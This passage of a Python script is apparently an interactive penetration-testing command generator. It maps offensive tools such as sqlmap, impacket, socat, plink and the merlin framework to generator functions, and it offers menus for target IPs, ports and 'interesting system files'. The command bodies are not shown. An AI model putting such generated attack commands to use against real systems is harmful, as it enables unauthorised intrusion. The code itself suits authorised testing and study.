    "cewl" : cewl,
    "wpscan": wpscan,
    "sshuttle": sshuttle,
    "sqlmap": sqlmap,
    "shell" : shell,
    "mysql" : mysql,
    "dig" : dig,
    "enum4linux": enum4linux,
    "smtp-user-enum": smtp_user_enum,
    "mount": mount,
    "plink": plink,
    "tcpdump": tcpdump,
    "powershell": powershell,
    "tar": tar,
    "mssql": mssql,
    "postgres": postgres,
    "wfuzz" : wfuzz,
    "runas" : runas,
    "impacket" : impacket,
    "find" : find,
    "merlin" : merlin,
    "socat" : socat,
    "snmp" : snmp,
    "others": others,
    "grep": grep,
    "cafae": cafae,
    "patator": patator,
    "dirsearch": dirsearch
}

systems = {"windows" : windows, "linux" : linux}

if tool_to_retrieve != "":
    options[tool_to_retrieve]()
    exit()

while True:
    print("You are currently in tool selection mode.  Please choose commmand to generate.")
    print('Otherwise, type "l" to list tools supported, "s" for interesting system files, "ch" to change ips and ports, "c" to clear screen, "e" to quit program.')
    choice = input("Input: ").strip()
    
    if choice == "l" or choice == "list":
        print("-" * 70)
        print("This program currently supports the following tools:")
        print("-" * 70)
        tools(options)
    elif choice == "c" or choice == "clear":
        clear()
    elif choice == "s" or choice == "system":
        print("-" * 70)
        while True:
            print('Enter "linux" for linux, "windows" for windows, "c" to clear screen, "b" to return.')
            selection = input('Input: ').strip()
            if selection == "b" or selection == "back":
                break
            elif selection == "linux" or selection == "windows":
                systems[selection]()
                break
            elif selection == "c" or selection == "clear":
                clear()
            else:
                print("Unrecognized input!")
    elif choice == "ch" or choice == "change":
        source_ip, target_ip, local_port = change(source_ip, target_ip, local_port)
    elif choice == "e" or choice == "exit" or choice == "quit" or choice == "q":
        print("Bye!")
        exit()
    elif choice not in options:
        print(f'This tool "{choice}" is not supported yet!')
        print("This program currently supports the following tools:")
        print("-" * 70)
        tools(options)
    else:
        options[choice]()
